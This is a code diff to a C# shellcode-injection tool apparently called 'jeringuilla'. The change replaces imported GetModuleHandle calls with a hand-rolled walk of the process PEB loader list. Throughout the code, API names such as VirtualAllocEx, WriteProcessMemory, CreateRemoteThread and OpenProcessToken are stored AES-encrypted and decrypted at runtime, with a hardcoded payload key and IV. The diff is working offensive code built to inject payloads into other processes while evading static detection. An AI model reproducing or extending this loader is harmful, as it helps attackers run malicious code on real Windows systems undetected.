@@ -21,9 +21,11 @@ namespace jeringuilla
         static String payload_aes_password = "ricardojoserf123ricardojoserf123";
         static String payload_aes_iv = "jeringa1jeringa1";
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
+        // [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)] public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
         [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
         // [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref PROCESS_BASIC_INFORMATION pbi, uint processInformationLength, ref uint returnLength);
+        private struct PROCESS_BASIC_INFORMATION { public uint ExitStatus; public IntPtr PebBaseAddress; public UIntPtr AffinityMask; public int BasePriority; public UIntPtr UniqueProcessId; public UIntPtr InheritedFromUniqueProcessId; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_DOS_HEADER { public UInt16 e_magic; public UInt16 e_cblp; public UInt16 e_cp; public UInt16 e_crlc; public UInt16 e_cparhdr; public UInt16 e_minalloc; public UInt16 e_maxalloc; public UInt16 e_ss; public UInt16 e_sp; public UInt16 e_csum; public UInt16 e_ip; public UInt16 e_cs; public UInt16 e_lfarlc; public UInt16 e_ovno; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)] public UInt16[] e_res1; public UInt16 e_oemid; public UInt16 e_oeminfo; [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)] public UInt16[] e_res2; public UInt32 e_lfanew; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_NT_HEADERS { public UInt32 Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER32 OptionalHeader32; public IMAGE_OPTIONAL_HEADER64 OptionalHeader64; }
         [StructLayout(LayoutKind.Sequential)] public struct IMAGE_FILE_HEADER { public UInt16 Machine; public UInt16 NumberOfSections; public UInt32 TimeDateStamp; public UInt32 PointerToSymbolTable; public UInt32 NumberOfSymbols; public UInt16 SizeOfOptionalHeader; public UInt16 Characteristics; }
@@ -52,6 +54,41 @@ namespace jeringuilla
             T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
             handle.Free();
             return theStructure;
+        }
+
+
+        unsafe static IntPtr auxGetModuleHandle(String dll_name)
+        {
+            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
+            uint temp = 0;
+            NtQueryInformationProcess(hProcess, 0x0, ref pbi, (uint)(IntPtr.Size * 6), ref temp);
+            IntPtr ldr_pointer = (IntPtr)((Int64)pbi.PebBaseAddress + 0x18);
+            IntPtr ldr_adress = Marshal.ReadIntPtr(ldr_pointer);
+            IntPtr InInitializationOrderModuleList = ldr_adress + 0x30;
+
+            IntPtr next_flink = Marshal.ReadIntPtr(InInitializationOrderModuleList);
+            IntPtr dll_base = (IntPtr)1;
+            while (dll_base != IntPtr.Zero)
+            {
+                next_flink = next_flink - 0x10;
+                dll_base = Marshal.ReadIntPtr(next_flink + 0x20);
+                IntPtr buffer = Marshal.ReadIntPtr(next_flink + 0x50);
+                String char_aux = null;
+                String base_dll_name = "";
+                while (char_aux != "")
+                {
+                    char_aux = Marshal.PtrToStringAnsi(buffer);
+                    buffer += 2;
+                    base_dll_name += char_aux;
+                }
+                next_flink = Marshal.ReadIntPtr(next_flink + 0x10);
+                if (dll_name.ToLower() == base_dll_name.ToLower())
+                {
+                    return dll_base;
+                }
+            }
+            return IntPtr.Zero;
         }
 
 
@@ -126,8 +163,18 @@ namespace jeringuilla
                     auxaddressOfNameOrdinalsRA += 2;
                 }
             }
-
             return IntPtr.Zero;
+        }
+
+
+        static IntPtr helpGetModuleHandle(String dll_name)
+        {
+            IntPtr dll_base = IntPtr.Zero;
+            while (dll_base == IntPtr.Zero)
+            {
+                dll_base = auxGetModuleHandle(dll_name);
+            }
+            return dll_base;
         }
 
 
@@ -207,11 +254,11 @@ namespace jeringuilla
 
             String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedCloseHandle = DecryptStringFromBytes("raaWfwu7TWCs4mgnq8Pytg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
             IntPtr addrCloseHandle = helpGetProcAddress(k32, decryptedCloseHandle);
             String decryptedAdvapi32 = DecryptStringFromBytes("9dOYL40gX4b0hNu/qgaXgA==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedOpenProcessToken = DecryptStringFromBytes("sF3ICi5AMd+hES18ADsvonBk3cp8AKV1ZyuKqaotGS8=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            IntPtr a32 = GetModuleHandle(decryptedAdvapi32);
+            IntPtr a32 = helpGetModuleHandle(decryptedAdvapi32);
             IntPtr addrOpenProcessToken = helpGetProcAddress(a32, decryptedOpenProcessToken);
 
             Process[] processCollection = { };
@@ -344,14 +391,13 @@ namespace jeringuilla
             RijndaelManaged myRijndael = new RijndaelManaged();
 
             String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
 
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedWriteProcessMemory = DecryptStringFromBytes("/nDO1wIStpfXAWtzJEfxi3MplH2K7Wg0M+ZmtjnkI08=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedCreateRemoteThread = DecryptStringFromBytes("EcLQmi+4wHc4weGwjNgqCQe+1LyC2VMgE3xKs7JyhZY=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
 
-            
             IntPtr addrOpenProcess = helpGetProcAddress(k32, decryptedOpenProcess);
             IntPtr addrVirtualAllocEx = helpGetProcAddress(k32, decryptedVirtualAllocEx);
             IntPtr addrWriteProcessMemory = helpGetProcAddress(k32, decryptedWriteProcessMemory);
@@ -392,8 +438,7 @@ namespace jeringuilla
             RijndaelManaged myRijndael = new RijndaelManaged();
 
             String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            IntPtr k32 = GetModuleHandle(decryptedKernel32);
-
+            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
 
             String decryptedOpenProcess = DecryptStringFromBytes("ZlWSQ5AeZIU0Z/vLWqlQmw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -443,7 +488,7 @@ namespace jeringuilla
             RijndaelManaged myRijndael = new RijndaelManaged();
 
             String decryptedKernel32 = DecryptStringFromBytes("1GAd1/G7gM4sph/yC0uQLg==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
-            IntPtr k32 = GetModuleHandle(decryptedKernel32);
+            IntPtr k32 = helpGetModuleHandle(decryptedKernel32);
 
             String decryptedCreateProcessA = DecryptStringFromBytes("2FXtT/hu7ZEj8oz79680TQ==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
             String decryptedVirtualAllocEx = DecryptStringFromBytes("3VykPNLrF3zOBfq50x+yew==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
